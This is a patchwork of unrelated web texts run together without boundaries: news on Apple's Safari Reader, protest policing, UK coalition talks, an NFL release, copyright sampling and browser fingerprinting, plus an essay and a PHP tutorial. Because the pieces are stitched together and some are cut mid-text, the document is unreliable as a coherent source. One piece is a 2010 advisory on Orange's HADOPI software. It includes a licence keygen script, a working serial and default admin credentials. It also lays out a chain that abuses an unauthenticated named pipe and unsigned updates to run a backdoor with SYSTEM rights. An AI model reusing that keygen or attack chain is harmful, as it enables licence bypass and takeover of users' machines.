I do n't think so .
Could it be , could it possibly be that Lord Oxburgh 's panel were given a list of papers to look at by UEA ?
Acton 's Eleven .
There were two awkward moments yesterday at Apple 's World Wide Developers Conference .
A few sites have already made much of Steve Jobs ' wireless networking difficulties during his demonstration .
But the real awkward moment was when Jobs launched into his defense of Apple 's app approval process , which was a kind of " take it or leave it " apologia that , for the most part , did n't answer any of the tough questions about why some apps get turned down .
Jobs ' point was to say , in effect , that those who want on Apple 's mobile devices can embrace the open world of HTML 5 on the Web , and / or play by Apple 's rules to get on the App Store .
If you 're a company looking for revenue , you 've got two options : the big open Web , and the App Store , with its own mysterious brand of capriciousness ( and a ton of money exchanging hands ) .
You might think that Apple holds both in equal esteem , but its release of Safari 5 shows that Apple has less regard for publishers on the Web than it does for publishers ( and developers ) it wants to entice to come to the App Store .
And the App Store is becoming its own little mirror - reflection of the Web .
You 've got content from news providers , you 've got social networking , you 've got games , RSS readers — the list goes on and on .
You 've also got , courtesy of Apple , a 100 percent Apple - owned , Apple - powered advertising platform called iAds .
Apple even called it a pillar of iOS .
iAds is , in other words , no hobby project .
Apple wants to help companies , developers , your grandma with coding skills — everybody — make money .
Sell apps , run ads , do both !
Developers make money !
Meanwhile , Apple makes 40 cents on every advertising dollar , while developers are more enticed than ever to come to the iPad .
It 's a profit cyclone for Apple : more apps mean more iPad sales .
More iPad sales mean more eyeballs , and more eyeballs mean more lucrative ads .
More lucrative ads mean more developers are enticed to write more apps that ultimately help sell more iPads .
Genius .
Ads make a lot of great stuff possible , and Apple knows it .
So how bizarre is it , then , when leaving Apple 's rosy App Store garden and entering the public square of the Web to find the following phrase on Safari 5's " new features " page :
" Safari Reader removes annoying ads and other visual distractions from online articles . "
So the company that has made an advertising platform a major part of its iOS strategy is also hawking an ad - blocking technology for its
Web browser , where it has no stake in ads .
App Store : use our unblockable ads , developers !
They help you get paid for your hard work !
Web : hey , block some ads , readers !
They 're annoying !
Of course , Reader is not an all - out ad - blocker .
It only blocks the presentation of ads on pages that are read in Reader mode , and Reader mode seems to only be available on pages that the browser thinks are articles and not indexes .
If it 's a one - page article , and the reader enters into Reader mode , publishers need not fret .
Ads were ( probably ) loaded on the initial visit , and then blocked when the page was reloaded .
There was an ad view for that page view .
Once you get to multipage articles though , Safari Reader could be pulling up 3 , 5 , 15 pages , all without ad presentation ( right now the scripting does call the ads , but they are n't displayed and advertisers are n't going to pay for ads they can tell are n't displayed ) .
I know of more than one editor out there that is currently worried about what this means for long - form , multipage publishing once this feature spreads .
While Safari 's market share is not particularly impressive on the desktop , the big browser makers all copy from one another sooner or later .
This feature will likely spread to Chrome , Firefox and IE , in some form , if it proves popular at all .
It could show up on Mobile Safari as well , which does have an impressive mobile market share .
There is something contradictory — some might say hypocritical — in Apple 's actions .
At the same time someone in Cupertino is building a completely unblockable ad platform for the iPhone and the iPad , someone else is working on ad supression tools for that big open Web that Apple supposedly loves so much .
At the same time that Apple is touting HTML 5 as the best way to make " emotional " advertising on both the Web and in the App Store , it 's calling Web advertising " annoying " and giving us tools to block it , but only when Apple is n't getting a cut .
And something tells me that an iAds blocker is not going to be approved for the App Store any time soon .
So in the end we 're left with a ) an open platform where Apple is willing to toy with Web publishers , modify their content presentation , and suppress their ads , and b ) Apple 's curated , closed platform , where everything is done by Apple 's rules or it 's not done at all .
On its own , a ) is understandable .
On its own , b ) is understandable .
But a ) + b ) = hypocrisy , unless Apple is going to allow users to suppress iAds , for free , on Apps that use iAds in the app store .
Disclaimers , asides , etc :
An article with as many moving parts as this could probably use some straight - up disclaimers at the end to help discussion stay productive .
Lots of confusion over what " hypocrisy " is .
It 's not a moral concept .
It 's an " expression of agreement that is not supported by real conviction . "
The point here is not that Safari Reader is evil .
It 's that there 's ideological tension between the App Store philosophy , the iAds effort , and what Reader does on the open Web .
" Annoying " is in the eye of the beholder .
My views on Ad Blocking can be found here .
This is not an article about Readability .
It 's an article about Apple .
While many people do n't like multipage articles because of the necessity to click , many sites use them because they increase revenue potential for articles that cost more to produce .
" Evil / Genius " is a tip of the hat to this most excellent article of days past .
I wrote this article on Windows 7 , listening to streaming music from my Mac Pro .
My home has two iPads .
I have 77 apps for iPhone and iPad .
I do n't particularly care for Lady GaGa .
They call it the Miami Model .
But it could be called the Genoa model , the Pittsburgh model and , after this weekend , the Toronto model .
It refers to police tactics used in Miami seven years ago , during the Free Trade Area of the Americas summit , and , more importantly , the protests erupting on the streets outside .
Manny Diaz , Miami ’s then - mayor , called the police methods exemplary — a model to be followed by homeland security when confronting protesters .
Human rights groups including Amnesty International called it a model of police brutality and intimidation .
Protesters were beaten with tear gas , sticks , rubber bullets . . .
You can watch police stun cowering protesters with Tasers on YouTube .
Last year , the city agreed it had trampled citizens ’ right to free speech by forcing marchers back from planned protests and settled out of court with Amnesty International .
What is the Miami Model ?
I called Naomi Archer to find out .
She is an indigenous rights worker from North Carolina who happened to be giving a lecture on the Miami Model yesterday at the U.S. Social Forum — the G20 for community activists .
Archer , who was in Miami as a liaison between protesters and police , has a 40 - box checklist to identify the Model .
Here are the main themes .
• Information warfare .
This starts weeks before the event .
Protesters are criminalized and dehumanized , and described as dangerous “ anarchists ” and “ terrorists ” the city needs to defend against .
“ Often , a faux cache is found , ” says Archer .
“ They are usually ordinary objects , like bike inner tubes , camping equipment , but the police make them out to look threatening .
It lays the groundwork for police to be violent and it means there ’s a reduced accountability of law enforcement . ”
• Intimidation .
Police start random searches of perceived protesters before any large rallies .
They are asked where they are staying , why they are walking around .
Police raid organizer ’s homes or meeting places , “ usually just before the summit , so there ’s maximum chaos organizers have to deal with , ” says Archer .
“ All this is meant to dissuade participants .
The best way to make sure you do n’t have a critical mass of people taking over the streets like in Seattle is to reduce the numbers at the outset . ”
This is usually made possible by last - minute city regulations , curtailing the right to protest .
In Miami , the city commission passed a temporary ordinance forbidding groups of more than seven to congregate for more than 30 minutes without a permit .
• “ They threw rocks . ”
That ’s the line police use after tear - gassing or beating protesters most times , Archer says .
Urine and human feces are variations on the theme .
But it ’s always the protesters who triggered the violence .
A popular police tactic is called “ kettling . ”
Officers on bike or horses herd protesters into an enclosed space , so they ca n’t leave without trying to break through the police line .
Take the bait ; you provoke a beating or arrest .
And of course , there are the famous agent provocateurs , outted publicly two years ago in Montebello .
Police officers dressed up like militant protesters to protect the peaceful crowd , they say ; Archer says it ’s to instigate trouble .
In Montebello , one of the three cops dressed in black was holding a rock .
“ It ’s the same lies every single protest , ” she says .
“ It ’s justification by law enforcement for their violent actions .
This is a propaganda war . ”
• Job well done .
At the end , regardless of the bodies clogging the temporary holding cells and hospitals , the police always congratulate themselves .
And by the time the cases go to court , the story is long forgotten and the circus has moved to a new unsuspecting town .
More than 270 people were arrested in Miami during the summit seven years ago .
How many were convicted , in the end ?
I called the American Civil Liberties Union to find out .
“ None , ” said lawyer Lida Rodriguez - Taseff , who was the president of the Miami chapter back then .

So far in Toronto , the police show has unrolled according to script ; we ’ve seen the propaganda , the cache , the intimidation , the secretive new regulations , the scary military arsenal .

Will we all believe that one too ?

Whenever we test drive an EV , we try to bring along a passenger who screams things out the window like " Beware !
Silent car ! " and " Electric vehicle !
Do n't get hit ! "
But we understand that for some of you this might not be an option .
Luckily , it looks like initiatives to outfit electric vehicles with warning sounds have been picking up steam , from the Pedestrian Safety
Act last year to a new bill that would have the National Highway Transportation Safety Administration establish a three year timeline for auto manufacturers .
According to Autoblog , " there 's no word as to how loud the noise would be or what it will sound like , " although drivers would not be able to turn it off , and it would likely be variable , depending on your speed -- not unlike the system Brabus uses in its Smart High Voltage EV .
As for your car - lovin ' Engadget editors , we 're already looking for one that emulates the growl of the ' 68 Ford Mustang that Steve McQueen drove in Bullitt .

To be continued ... Ibsen
David Cameron 's hopes of forming a coalition with the Liberal Democrats were dramatically undermined last night by the leaking of a top - secret letter outlining the hardline Eurosceptic stance he and William Hague planned to adopt in government .
The document , obtained by the Observer , is headed " draft letter from Foreign Secretary to Prime Minister " and was written last week .
It assumed an outright Tory victory and spelt out how Hague intended to adopt a tough approach to Europe at a meeting of EU foreign ministers in Brussels tomorrow .
In the letter , compiled by civil servants but written in the first person , Hague tells Cameron how his message would be that " the British relationship with the EU has changed with our election " to one firmly against any further integration .
Exposing the massive gulf between Liberal Democrat leader Nick Clegg and the Conservative leadership on Europe , Hague says he would demand the right to repatriate powers over criminal justice as well as social and employment policy during the first term of a Tory government – demands many EU leaders say they would resist .
Hague planned to tell his EU counterparts : " Rest assured that we seek engagement , not confrontation .
But our aim is to achieve these commitments during this parliament . "
He would also tell his first foreign ministers ' meeting " we will never join the euro " and conclude : " You will find us firm but fair , playing a leading role , fighting our corner , practical and straight - talking . "
Last night the Tories said they had no knowledge of the letter .
But the Observer understands it was drawn up on the basis of detailed briefings between senior civil servants and Hague .
The document came to light as Clegg , a strong pro-European , yesterday met his MPs and senior party figures to discuss a possible coalition with the Tories , who emerged from Thursday 's general election with the largest number of seats but short of an overall majority .
Cameron and Clegg held face - to - face talks late yesterday as they continued their attempts to thrash out a power - sharing deal .
A senior Conservative party spokeswoman said the talks were " constructive and amicable " .
The 70 - minute meeting took place at Admiralty House in Whitehall .
A Lib Dem spokesman also described the discussions as " constructive and amicable " .
Tory and Lib Dem sources said last night that discussions would not conclude until the beginning of the coming week at the earliest .
An emergency meeting of the 1922 committee of Tory backbenchers will be held tomorrow to discuss the possible coalition .
Today , Hague , Oliver Letwin and George Osborne will resume talks with the Lib Dems ' Vince Cable , Chris Huhne and David Laws .
But the stark language used in the letter is bound to alarm Clegg , who has been savage in his criticism of the Conservatives ' attitude to Europe which he believes is rooted in the past and will limit Britain 's ability to fight cross - border crime and meet the environmental challenges of the 21st century .
The document will also be seen by Lib Dem MPs and the party 's rank and file as evidence that their pro-Europeanism would be compromised by linking up with the Tories .
A Lib Dem spokesman said the party was strongly pro-European , but would not be drawn on the document .
Yesterday Cameron came under pressure from senior figures in his own party not to give in to Clegg 's demands by watering down Conservative manifesto commitments .
Shadow defence secretary Liam Fox warned that a Tory government could not be " held to ransom " by Lib Dems demanding proportional representation .
Clegg may also face opposition from within his party to any attempt to form a coalition with the Tories , particularly on economic issues .
Yesterday the Social Liberal Forum , which represents left - leaning Lib Dems and includes a third of the party 's MPs , issued a set of " red lines " which it said the party must not cross , including any measure that would increase the gap between the rich and poor – ruling out supporting the Tory pledge to cut inheritance tax .
Three other red lines were any suggestion of cuts to frontline services in the current financial year , any worsening treatment of asylum seekers and any watering - down of the human rights act .
Meanwhile , Gordon Brown and his closest advisers were working on how to expand their counter - offer to the Lib Dems , including a referendum on changes to the voting system .
Senior officials said Labour was planning to draw up a formal " coalition contract " – as happens in Germany – that would bind the Lib Dems and other smaller parties into a deal if the Tory discussions with the Lib Dems were to fail .
Most Labour ministers now believe Brown would have to step down before Clegg would consider a pact , though senior government insiders insisted this was not being discussed as an option .
One re-elected Labour MP , John Mann , of Bassetlaw , called on Brown to step down as Labour leader , claiming that the party would have influence on the outcome of the current negotiations only if Brown agreed to give up the leadership .
" Brown should not lead Labour into any future election and he should stand down before the next Labour party conference , " he said .
" Gordon Brown 's continuation as leader rules out the credibility of a Lib - Lab pact that has to prioritise the modernisation and reform of the antiquated UK political systems . "
• On Sunday , the Foreign Office released a statement in response to the Observer 's story .
A spokesman said : " This is a draft paper , drawn up by Foreign Office officials on their own initiative as part of the civil service 's normal and private contingency planning for a possible Conservative government .
It was produced in line with cross-Whitehall guidelines for such contingency planning .
" The document was not shown to any representative of the Conservative
party or anyone else outside the civil service .
" The permanent undersecretary at the FCO , Sir Peter Ricketts , has
immediately opened a enquiry into this regrettable and unprofessional
leak of a classified internal draft document . "

WASHINGTON , April 30 ( UPI ) -- Civil liberties advocates decried a Democratic proposal that would require all workers in the United States to carry an ID card with biometric identifiers .
Senate Democratic leaders Thursday revealed an outline to reform U.S. immigration laws , including a proposal requiring workers to carry a national card with biometric data , such as fingerprints , within six years .

The American Civil Liberties Union ripped the ID card program , called " Believe , " an acronym for Biometric Enrollment , Locally - stored Information and Electronic Verification of Employment , The Hill reported Friday .
" Creating a biometric national ID will not only be astronomically expensive , it will usher government into the very center of our lives , " ACLU legislative counsel Christopher Calabrese said .
The immigration system needs " real , workable reform , " but not at the expense of individual freedoms , Calabrese said .
The proposal would require all workers to carry a card with a digital encryption key that must match work - authorization databases .
Majority Whip Sen. Dick Durbin , D - Ill. , who worked on the outline and helped present it Thursday , said the public has become more comfortable with the idea of a national identification card .
" For a long time it was resisted by many groups but now we live in a world where we take off our shoes at the airport and pull out our identification , " Durbin said .
" People understand that in this vulnerable world we have to be able to present identification . "
Reform Immigration for America , a pro-immigrant group , praised Democrats for laying the groundwork for discussion , but said the framework still fell short , The Hill said .
" The proposal revealed today ( Thursday ) ... represents a possible path forward on immigration reform , " the group said in a statement .
" This framework is not there yet . "
The LenDale White experiment in Seattle is over .
White was released on Friday , and a league source told ESPN's Adam Schefter that he is facing a four - game suspension from the NFL for violating the league 's substance - abuse policy .
" We have not announced any such suspension , " league spokesman Greg Aiello told The Associated Press on Friday night .
" I have no other information on it . "
The list of players enrolled in the league 's substance - abuse program for a prior incident , and therefore subject to discipline , is confidential .
Acquired from the Tennessee Titans in a trade , White reported to the Seahawks in great shape .
He was down to 220 pounds after being 250 pounds at times as a member of the Titans .
" It became apparent at this time that LenDale was not ready to be a member of the Seattle Seahawks , " Seahawks GM John Schneider said .
" It just did not appear to be the right fit at this point in our program .
We wish LenDale all the best with his future . "
White came to the Seahawks during the third day of the NFL draft .
The team also acquired defensive tackle Kevin Vickerson .
The trade reunited White with Seahawks coach Pete Carroll , whom White played for at USC .
White 's uncle said his nephew is " confused " and not doing well with the Seahawks ' decision .
Herman
White told The Associated Press in a phone interview Friday night that he 's been speaking with the former USC star throughout the day and that " he was n't doing good . "
The uncle White said he did not know if White was facing a four - game suspension for violating the league's
drug policy .
He said he was due to speak to the Titans ' former
leading rusher later Friday night or Saturday to find out more .
" He was surprised , " Herman White said , adding LenDale told him
this week how great his second NFL chance was going with Carroll .
" I 'm pretty shocked , based on what
he 's been telling me .
" His emotions and all ... he was n't doing good [ Friday ] . "
The Seahawks gave up on White after he had only limited chances to display his work ethic .
He participated in one minicamp and a handful of organized team activities on the practice field before the team waived him .
White had lost more than 45 pounds last year , saying that when he stopped drinking tequila the pounds starting falling off .
He was down to 220 .
White said he wanted to get back up to 228 pounds for this season .
Seattle 's starting job seemed within his reach as Carroll opened every position to competition .
He missed one day of organized team activities this month .
He said on Monday there was some " family stuff I had to take care of . "
Agent Drew Rosenhaus did not immediately return phone and e-mail messages left by The Associated Press .
He was on the phone late Friday afternoon with his client sorting out a confusing sequence in which the Seahawks put out an announcement on their website around noon that White had been released , only to take it down soon after .
Hours later , Schneider made it official in a statement released by the team .
Earlier this week ,
White said he felt great .
He thanked Carroll for rescuing him from his dead end in Tennessee .
" Going from 'SC , back - to - back national championships to not playing at all , it 's a life - changing thing , " White said Monday .
" But I 'm still here .
Pete gave me another chance .
" I do n't think I 've been this healthy since I was 18 years old . "
Carroll said Monday that the team would see how everything fit together .
" He 's got a long ways to go to get back in here with this club , but we 're going to certainly wait it out and see how it does , " he said .
The wait lasted all of four days .

By Date By Thread Patriotic botnet with Orange 's HADOPI software From : cult dead hadopi < cult.of.the.dead.hadopi ( ) gmail com >
Date : Tue , 15 Jun 2010 14:10:08 +0000
-- TOP SECRET -- TOP SECRET -- TOP SECRET -- TOP SECRET -- TOP SECRET -- --== [ CULT OF THE DEAD HADOPI ]==-- Advisory 1
The HADOPI law or Creation and Internet law ( French : Loi favorisant la diffusion et la protection de la création sur Internet , " law promoting the distribution and protection of creative works on the internet " ) is a French law introduced during 2009 , attempting to control and regulate internet access as a means to encourage compliance with copyright laws .
" HADOPI " is the government agency created by the eponymous law .
http://en.wikipedia.org/wiki/HADOPI_law
In fact , HADOPI is also the secret name of a French program designed to get offensive capacities targeting the Internet .
In order to recruit every computer of the country in this patriotic botnet ( like in China ) , the government has urged every citizen to install a software which will prove they do not download music and movies .
But the software is in fact a backdoor ...
The first company helping the government to recruit bots is Orange , the former French national telecom group .
Now , it has become a worldwide telecom giant .
A few years ago , Orange also became a content provider ( football , tv series , and many more ) .
Everyone can now understand this is a long term strategy : 1 . Orange provides contents , such as football , tv shows , ... 2 . The Government says every citizen must install a software to prove they do not download illegal contents .
3 . Orange provides such a software .
4 . [ TOP SECRET ]
Every computer where this software is at risk can become a bot for the French government .
The cult of the dead HADOPI has decided to disclose this plot to the public .
The software ************
You can subscribe to the service for 2 euros a month ( yes , you pay to install a rootkit on your computer ) : http://telechargement.assistance.orange.fr/ct/Install-CT.exe version : 1.0.0.0 md5 : a5858eed01b8a842cd63bcec3fd93f14 date : June 14 , 2010 June 15 , 2010 : Orange has shut down the website providing the binary .
For those who wants to look at it , it is also available here : http://rapidshare.com/files/399290129/Install-CT.exe.html
Activating the program **********************
In order to have the protection running properly , one has to activate the software and get a licence .
To do so , it connects to : http://update-cdt.nordnet.fr/hadopi-server-technical-ws-1.0.x/HadopiTechnicalServlet
You can check the activation of your software and every French citizen 's one by connecting to the administration console of the JBoss server account " admin " and password " admin " .
This is now fixed but was open for 2 days during the week - end .
Nevertheless , we suspect this to be the command center of the botnet .
Anyway , you can also activate the software without connecting to this server because : 1 . Every piece of the communication is in clear text .
2 . The software supports the configuration of a proxy .
So , if you want to be protected , but not join the patriotic botnet , the cult of the dead HADOPI provides a keygen :
------------ $ cat hadopi-keygen.rb #!/usr/bin/env ruby require ' digest/md5 ' CHARS = %w{ 0 1 2 3 4 5 6 7 8 9 A B C D E F } serial = " %s%s%s%s-%s%s%s%s-%s%s%s%s - " % Array.new ( 12 ) { CHARS[ rand( CHARS.size ) ] } serial << Digest :: MD5.hexdigest( serial ) [ - 4,4 ] . upcase puts serial ------------
If you do not have the capability to run this script , here is a serial : HADO - PIHA - DOPI -AC7B
However , be aware that you can still be recruited in the patriotic botnet at any time ...
Useless filtering *****************
The first public goal of the software is to prevent the citizen from downloading illegal content .
As part of a secret plot to build a patriotic botnet , one could expect it fulfills its first mission .
Currently , the server becomes unresponsive , and it is not possible to retrieve a list of signatures to show how easy it is to bypass it .
It will be for next time :)
A funny thing to note :
The program checks whether a new process is packed by UPX , PECompact2 or Armadillo , and if yes ... it call the sleep ( ) function with a time based on the size of the executable ( WTF ? ) .
And nothing else like an unpacking process .
A first look at the content protection software ***********************************************
The protecting software has 2 components : - cdtsvc ( 64 ) .exe is registered as a Windows service in charge of inspecting every new software when it starts .
- cdtgui.exe is the configuration part , running as a simple user .
It makes it possible to look at the logs , start / stop the service , configure the application , ...
All these features are password " protected " .
An interesting detail , services are digitally signed by France Telecom S.A. : sigcheck v1.53 - sigcheck Copyright ( C ) 2004 -2008 Mark Russinovich Sysinternals - www.sysinternals.com c:\program files \controle du telechargement\cdtsvc64.exe : Verified : Signed Signing date : 14:35 02/06/2010 Publisher : Nordnet Description : Service de Contrôle du téléchargement Product : Contrôle du téléchargement Version : 1 , 0 , 0 , 0 File version : 1 , 0 , 0 , 0 Seems to be interesting on Windows 7 x64 ;)
Note that the password is saved in the registry as : SHA1 ( unicode ( password + " Hadopi Secret Partage " ) ) in the " StartupState " value of the key : HKLM \SYSTEM\CurrentControlSet\Services\cdtsvc
So , if you are able to find collisions on SHA1 , you are done .
But if you could do it , you would not care about this software , so let us assume you can not .
Almost retrieving your password
-------------------------------
If you are protected by this software , and you forgot your password , you can still authenticate .
Since the GUI runs as the user , and since the user is allowed to debug his own process , you just have to switch the comparison between the stored password and the entered one .
This method is very reliable , but will not be described as there are other much better ways for lazy guys like us .
Changing the password ---------------------
As every modern software handling secrets , the protecting software provides a way to reset your password .
If you forget it , you have to give the answer to a secret question .
The answer to this question is stored in the registry .
And it can be accessed by the user himself .
But it is ciphered ( using DPAPI ) .
But the service can decipher and modify the secret answer for us :)
So , the goal is to get access to this service , even as a user with no privilege .
Fortunately , Orange provides a way to do it with internal communication between processes .
See next section ( what a suspense :) Internal communication ----------------------
The multiple threads ( not described here for clarity of course ) are communicating with each other through a named pipe ' \\\\.\pipe\CTPipe ' .
NO AUTHENTICATION IS REQUIRED TO SEND / READ MESSAGE ON THIS PIPE .
So , why would we care about a password ...
What does it mean ?
It means you can administrate the software even as a simple user with no knowledge of the password !
Really ?
Yes , you can !
But there is still more ...
Recruiting a bot thanks to Orange and the French government ***********************************************************
Let us assume an evil hacker gets hold of the control server providing updates to every potential French citizen update- cdt.nordnet.fr .
When the software wants to be updated , it asks the server for a file named cdtupd.exe.zip .
This file is downloaded _by the service cdtsvc_ in IE 's temp files directory .
Then , it is extracted in its installation directory , C : \Program Files \Controle du Telechargement\ .
Next , this cdtupd .
exe is run _by the service cdtsvc_ with no check at all , which means with SYSTEM privileges .
Since the updates are not signed , anyone accessing nordnet .
fr can pwn every Orange customer , including Orange , and the French government to recruit bots for their patriotic botnet .
Subverting Orange 's patriotic botnet ************************************
The cult of the dead HADOPI was hoping this software designed to protect the French citizen from illegal downloading , designed to give real offensive capacities to the French government , would at least be secure .
It is not .
We retrieved some of the commands one can send to the named pipe : - 1002 : check password - 1006 : set password - 1007 : get secret question - 1009 : check if an update is available - 1010 : ask for an update - 5000 : enable / disable the " protection " - 5002 : get history - 5003 : get updates history - 5004 : change the configuration
The 5004 order is really interesting : it can modify the internal configuration ( proxy host and port , updates server address , answer to the secret question , licensed state ) .
A local user with no privilege can communicate with the service through the named pipe , change the configuration to use a proxy server .
Then , the evil bastard will request an update .
The request will arrive on the proxy , and the proxy will serve a backdoor ( OMG ! ) .
Here is the proxy : ------------ $ cat hadopi-proxy.rb #!/usr/bin/env ruby require ' socket ' require ' digest/md5 ' require ' base64 ' require ' pp '

Re : Patriotic botnet with Orange 's HADOPI software no no ( Jun 15 )
cult dead hadopi ( Jun 15 )
David Graeber on Interviewed on CBC
When the Canadian Broadcasting Company needed a go - to anarchist to help make sense of the ( then ) upcoming G20 Summit protests , they interviewed AK author , and all - around nice guy , David Graeber .
David does a nice job of injecting some balance into the mainstream media … balance that pretty much disappeared once the Summit began .
David has also written extensively on the strategies , meanings , and tactics of such mass actions in Direct Action : An Ethnography .
Watch below … then get the book !
Thanks to Michael Truscello and Common Cause for making this available !
An analysis of Scots - Irish may help to explain why rural white voters in many areas of the South and West often share similar viewpoints , and why they differ from rural whites in areas like New England and the upper Midwest in their cultural beliefs and voting patterns .
Brandeis Professor David Hackett Fischer writes in Albion 's Seed , " 90 percent of the backsettlers [ in Appalachia ] were either English , Irish or Scottish ; and an actual majority came from Ulster , the Scottish lowlands , and the [ Scots - English ] north of England ... they established in the southern highlands [ of the U.S. ] a cultural hegemony that was even greater than their proportion in the population . "
Only 1.5 % of the U.S. population identified as Scots - Irish in the last census , but there are many more whose origins have been lost to history , and their influence is much stronger than their sheer numbers .
Anecdotally , country music is the direct descendant of Scots - Irish folk music .
Many Protestants who identify as Irish are likely of Scots - Irish descent : a very high number of Irish Protestants in the 1800s were of Scottish origins .
Many Scots who came over in the early years of the Republic are Scots - Irish as well .
Finally , the 2000 Census map of the concentration of the 7.2 percent of U.S. citizens who identify their ethnicity as " American " in the census very closely mirrors maps of Scots - Irish settlement patterns .
Sen. Jim Webb ( D - VA ) , himself a proud Scots - Irishman , wrote in his book Born Fighting that approximately 10 % of Americans , or 30 million people , are of Scots - Irish descent .
Unlike other ethnic groups in the U.S. , the Scots - Irish do not overtly identify as an ethnic bloc in politics .
As University of North Carolina professor emeritus John Shelton Reed put it , " You ask people what their ethnicity is , and a lot of Scots - Irish people either do n't know or if they know it they just [ do n't ] acknowledge it .
It 's not something they really identify with .
They 're just plain old Americans , plain vanilla .
I do n't think they are a self - conscious voting bloc . "
Sen .
Webb argues , " Few key Democrats seem even to know that the Scots - Irish exist , as this culture is so adamantly individualistic that it will never overtly form into one of the many interest groups that dominate Democratic Party politics . "
He blames former Vice President Al Gore 's loss in 2000 on his losses in Tennessee and West Virginia , which he attributes to Gore 's positions on gun rights .
Still , while the Scots - Irish may not participate in the same group politics that other ethnicities do , they still share many common cultural values that have held on in many parts of the country , especially the Appalachian South .
Richard Nisbett and Dov Cohen , psychology professors at the University of Michigan and University of Illinois , conducted an in - depth study in the 1990s examining what they dubbed the " Culture of Honor " prevalent in the South .
In trying to find out why violence rates were significantly higher in the South , they discovered that white southerners tended to be much more likely to resort to violence to defend their property or honor than whites in other parts of the country .
Their studies controlled for poverty rates throughout the region , as well as for other factors including weather ( warmer areas tend to be more violent ) and the legacy of slavery ( areas with fewer blacks actually experienced more violence amongst whites , they found ) .
This trend was not nearly as strong in the larger , more metropolitan cities of the South but was especially prevalent in the small , more isolated and culturally distinct small cities and towns throughout Appalachia and the rural South .
These are the areas where the Hatfields and McCoys , the Turners and Howards ( all Scots - Irish ) feuded for years .
The psychologists then ran a series of experiments where they antagonized both southerners and northerners , and found that southerners were much more prone to violence when slighted .
Get a URL ’s Reddit Score Using PHP and JSON
Since we can see Digg turning more into a funny - pic - and - vid site each day , I 've turned my attention to Reddit .
Reddit just seems more controlled and programmer - friendly .
Since I have respect for Reddit I thought I 'd put together a quick tutorial on how you can retrieve a URL's Reddit score using PHP .
The PHP
<? php /* settings */ $url = ' https://davidwalsh.name/9-signs-not-to-hire-that-web-guy'; $ reddit_url = ' http://www.reddit.com/api/info.{format}?url='.$url; $ format = ' json ' ; //use XML if you 'd like ... JSON FTW !
$ score = $ups = $ downs = 0 ; //initialize /* action */ $ content = get_url ( str_replace ( '{ format} ' , $ format , $reddit_url ) ) ; // again , can be xml or json if ( $ content ) { if ( $ format == ' json ' ) { $ json = json_decode ( $ content , true ) ; foreach ( $ json [ ' data ' ] [ ' children ' ] as $ child ) { // we want all children for this example $ ups+= ( int ) $ child [ ' data ' ] [ ' ups ' ] ; $ downs+= ( int ) $ child [ ' data ' ] [ ' downs ' ] ; //$ score+= ( int ) $ child [ ' data ' ] [ ' score ' ] ; // if you just want to grab the score directly } $ score = $ups - $ downs ; } } /* output */ echo " Ups : $ ups < br /> " ; //21 echo " Downs : $ downs < br /> " ; //8 echo " Score : $ score < br /> " ; //13 /* utility function : go get it ! */ function get_url ( $url ) { $ ch = curl_init ( ) ; curl_setopt ( $ch , CURLOPT_URL , $url ) ; curl_setopt( $ch , CURLOPT_RETURNTRANSFER,1 ) ; curl_setopt ( $ch , CURLOPT_CONNECTTIMEOUT,1 ) ; $ content = curl_exec ( $ch ) ; curl_close ( $ch ) ; return $ content ; } ?>
Parsing the JSON is simple using json_encode with the value of true to make turn the JSON into an associate array .
My example shows how you can grab the number of " ups " and " downs " -- not just the score .
As with every API / web service , I highly recommend caching the result of your request .

While we raised the money to license about two - dozen songs and some footage , our film nevertheless contains over 400 brief - but - unlicensed uses of copyrighted material .
When I can't sleep at night , I sometimes count how much we'd be liable for : up to $ 150,000 in statutory damages , per infringement .
400 x $ 150,000 = $ 60,000,000 .
Sixty .
Million .
Dollars .
One of the more headache - inducing aspects of the way copyright law is interpreted is how haphazardly it is applied in different contexts .
When writing a book , quoting another book is perfectly acceptable , but quoting more than two lines from song lyrics ( even if it takes less than 0.001 percent of the book 's total text ) might give you and your publisher a problem .
If your band perfectly imitates a distinctive drum rhythm from a Bo Diddley record , no worries , musicians have been doing that for half a century .
But when you sample Diddley 's beat it could be a copyright infringement if you do n't get permission .
Inversely , you do n't need approval when you record a cover of someone else 's song , as long as you pay the per-song fee that is set by Congress and do n't alter the lyrics .
It gets really confusing .
In a page ripped straight from Evil Corporation Digest , one of those slapped with a suit was George Clinton - - for sampling one of his own records .
True story .
" Yeah , I got sued for sampling my own stuff , " Clinton told us with a bemused smile .
" In fact , I still got a suit pending . "
After trying for six weeks to license a song that Bridgeport partially controlled , a company representative finally got back to us .
The man on the other line -- who I imagine was chomping on a cigar -- said only , " Denied ! "
Before abruptly hanging up , he added , " Denied .
No reason ! "
In an email , Bridgeport reminded us that " any of the songs involved in the sample settlements ( Public Enemy , Digital Underground , and others ) are entirely separate compositions which we own a portion of and which require our approval . "
That 's because Bridgeport now controls portions of hundreds of hip - hop songs as a result of their litigation .
For instance , if you want to license Digital Underground 's biggest hit , " The Humpty Dance , " you have to deal with Bridgeport -- as well as up to five other companies currently listed as co-owners .

Back in January , I attended Public Knowledge 's excellent " Fair Use Movie Night " and wrote about it here on Techdirt .
One of the speakers was Kembrew McLeod , who explained how difficult it was to make his film , , which is mostly about music sampling , and how the lawyers made that incredibly difficult .
Over at The Atlantic , McLeod has a great article that is effectively a written version of what he said that night , discussing the legal insanity of trying to make a documentary about sampling without getting sued .
While he did pay for and clear some of the clips in the film , there are over 400 clips that are uncleared -- and while he 's betting that fair use would save him , he has no idea if it really would , and there 's no way to know for sure unless someone sues him .
And if someone sues him , the liability is not something to laugh about :
He points out how copyright law is not only ridiculous in such situations , it 's also haphazard in that it's not applied consistently at all :
This was the point we made recently concerning the difference between a " sampled " written work , and a sampled album .
McLeod also retells my favorite story from the night I saw him speak ( which I wrote about in that original post ) concerning his ( brief ) interactions with Bridgeport , the famed sample troll , though in this telling he adds some more details , including the fact that George Clinton has been sued for sampling his own music :
Yes , five companies , each of which need to grant their approval and ( not mentioned in the article , but spoken about back in January ) is the fact that if one of the five ( or , in some cases , more ) companies demands a higher fee , all of the other co-owners need to get that higher amount as well .
It makes it prohibitively expensive .
This is unfortunate , because in many ways it 's taken the fair use right out of music .

New research by the Electronic Frontier Foundation ( EFF ) has found that an overwhelming majority of web browsers have unique signatures -- creating identifiable " fingerprints " that could be used to track you as you surf the Internet .
The findings were the result of an experiment EFF conducted with volunteers who visited http://panopticlick.eff.org/.
The website anonymously logged the configuration and version information from each participant 's operating system , browser , and browser plug-ins -- information that websites routinely access each time you visit -- and compared that information to a database of configurations collected from almost a million other visitors .
